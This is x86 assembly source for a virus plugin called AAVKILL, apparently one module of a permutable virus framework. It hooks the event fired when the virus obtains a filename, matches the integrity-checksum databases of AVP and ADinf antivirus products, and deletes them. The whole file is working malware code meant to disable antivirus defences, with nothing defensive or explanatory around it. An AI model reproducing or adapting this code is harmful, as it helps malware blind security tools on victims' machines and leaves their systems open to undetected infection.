   ; AAVKILL
   ; ~~~~~~~
   ; - antiviral csum-file killer (adinf/avpi/?)

   include                 INCLUDE\consts.inc
   include                 extman.inc
   include                 rxio.inc

   include                 plugin.inc
                           PLUGIN_START    AAVKILL, CODE32, PERMUTABLE

   handleevent:            hookevent EV_EXTMAN_GOT_FILENAME, go
                           stc
                           retn

   go:                     pusha

                           xor     ecx, ecx

   __cycle:                mov     eax, [edx]
                           inc     edx

                           or      al, al
                           jz      __endcycle

                           xor     eax, [edx-1+4]
                           or      eax, 20202020h
   ; avpi.dar
                           cmp     eax, ('ipva' xor 'rad.') or 20202020h
                           je      __kill

                           xor     eax, [edx-1+8]
                           or      eax, 20202020h
   ; avpitabe.dat
                           cmp     eax, ('ipva'  xor 'ebat' xor 'tad.') or 20202020h
                           je      __kill

   ; x@@{xxx}xxx.INF
                           mov     eax, [edx]
                           shr     eax, 8
                           neg     eax
                           cmp     eax, -'@@{'
                           sete    cl
                           or      ch, cl

                           mov     eax, [edx]
                           cmp     al, '}'
                           sete    cl
                           shl     cl, 1
                           or      ch, cl

                           mov     eax, [edx]
                           or      eax, 20202000h
                           neg     eax
                           cmp     eax, -'fni.'
                           sete    cl
                           shl     cl, 2
                           or      ch, cl

                           cmp     ch, 111b
                           je      __kill

                           jmp     __cycle

   __endcycle:             popa
                           stc     ; keep event
                           retn

   __kill:

   IFDEF   DEBUG
                           nop
                           nop
   ELSE
                           mov     edx, [esp].pusha_edx
                           event   EV_rx_deletefile
   ENDIF
                           jmp     __endcycle

                           PLUGIN_END
